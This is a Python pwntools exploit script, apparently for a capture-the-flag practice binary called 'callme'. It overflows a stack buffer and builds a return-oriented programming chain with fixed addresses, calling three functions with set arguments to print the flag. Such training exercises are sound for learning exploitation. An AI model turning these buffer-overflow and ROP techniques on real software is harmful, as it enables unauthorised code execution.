#!/usr/bin/env python3

from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
#p = gdb.debug('./callme','b main \n b pwnme \n b *0x401a54 \n b *0x401850 \n b *0x401870 \n b *0x401810')
p = process('./callme')
#context.log_level = 'DEBUG'
junk = ("A"* 40).encode()
plt_main = p64(0x401996)
popArgs0to2 = p64(0x401ab0)
#one = "1\x00".encode()
#two = "2\x00".encode()
#three = "3\x00".encode()
one = p64(0x1)
two = p64(0x2)
three = p64(0x3)
callmeone = p64(0x401850)
callmetwo = p64(0x401870)
callmethree = p64(0x401810)
load_args = popArgs0to2+one+two+three
p.recvuntil('>')
p.sendline(junk+load_args+callmeone+load_args+callmetwo+load_args+callmethree)
p.recvuntil(' ')
flag = p.recv()
log.success("Flag: "+flag.decode('ascii'))
